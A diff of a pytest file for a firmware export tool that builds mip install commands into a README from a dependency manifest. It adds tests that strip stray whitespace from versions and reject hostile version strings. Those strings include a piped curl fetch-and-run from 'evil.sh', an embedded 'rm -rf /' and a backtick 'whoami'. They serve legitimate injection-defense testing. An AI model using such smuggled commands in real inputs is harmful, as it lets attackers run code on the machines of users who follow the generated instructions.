@@ -1217,26 +1217,47 @@ def test_export_upload_ready_non_utf8_manifest_reports_manifest_read_failed(tmp_
     assert not (project / "upload_ready").exists(), "the export never started, so nothing was destroyed"
 
 
-def test_export_upload_ready_rejects_a_mip_version_with_a_trailing_newline(tmp_path):
-    """`$` also matches before a single trailing newline, so "1.3.4\\n" satisfied the charset
-    and carried a stray blank line into the fenced command block a user is told to run.
-
-    VERSION, not package: _normalize_mip_entry strips the package in both the string and
-    dict forms (serve.py:764,770), so a newline can never reach the charset test through it.
-    version is the field that is NOT stripped, which is what makes this reachable at all."""
-    manifest = {"runtime_dependencies": {"mip": [{"package": "aioble", "version": "1.3.4\n"}]}}
+def test_export_upload_ready_recovers_a_mip_version_with_stray_whitespace(tmp_path):
+    """A trailing newline on version is a recoverable intent, not hostile input. Every
+    sibling field is stripped; version being the exception is what let "1.3.4\\n" reach the
+    charset at all. Strip it and emit the right command, rather than failing the charset and
+    demoting a perfectly good package to an "install manually" bullet -- the canonical
+    install_mip_dependencies.py does not even use version in its argv, so dropping the whole
+    entry over one would be strictly worse than the reference behavior."""
+    manifest = {"runtime_dependencies": {"mip": [{"package": "aioble", "version": " 1.3.4\n"}]}}
     project = _minimal_firmware_project(tmp_path / "project", manifest=manifest)
 
     _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
 
-    # No device README in this fixture, so the generated instructions keep the README.md name.
     readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
-    assert "aioble@1.3.4" not in readme, "the newline version is never embedded in a command"
-    # Every line inside every fenced block is one intact command: a rejected spec cannot
-    # have split one across two lines, which is what the trailing newline would have done.
+    assert "mip install aioble@1.3.4" in readme, "the version is recovered, not discarded"
+    assert "unrecognized package spec" not in readme, "and the package is not demoted to a bullet"
     for block in readme.split("```")[1::2]:
         for line in (l for l in block.splitlines() if l.strip()):
             assert line.startswith("mpremote "), f"stray line in a command block: {line!r}"
+
+
+def test_export_upload_ready_rejects_a_hostile_mip_version_but_still_names_the_package(tmp_path):
+    """Stripping recovers whitespace; the charset still gates everything else. A version
+    carrying a shell metacharacter or an embedded newline cannot reach the fenced block a
+    user is instructed to run, and the package is reported rather than silently vanishing."""
+    for hostile in ("1.3.4; curl evil.sh | sh", "1.3.4\nrm -rf /", "1.3.4`whoami`"):
+        manifest = {"runtime_dependencies": {"mip": [{"package": "aioble", "version": hostile}]}}
+        project = _minimal_firmware_project(tmp_path / f"p{abs(hash(hostile))}", manifest=manifest)
+
+        _dispatch(_noop_shim(), "project.export_upload_ready", {"project_dir": str(project)})
+
+        # No device README in this fixture, so the instructions keep the README.md name.
+        readme = (project / "upload_ready" / "README.md").read_text(encoding="utf-8")
+        # Positive assert: the entry is DEMOTED to a bullet, not dropped. Without this the
+        # test would pass just as well if the whole manifest pipeline broke and produced
+        # "No external packages required."
+        assert "unrecognized package spec" in readme, hostile
+        assert "aioble" in readme, f"{hostile}: the user is still told which package needs doing by hand"
+        for block in readme.split("```")[1::2]:
+            for line in (l for l in block.splitlines() if l.strip()):
+                assert line.startswith("mpremote "), f"{hostile}: stray line in a command block: {line!r}"
+                assert "curl" not in line and "rm -rf" not in line and "whoami" not in line, hostile
 
 
 def test_export_upload_ready_malformed_json_manifest_errors_not_silently_no_deps(tmp_path):
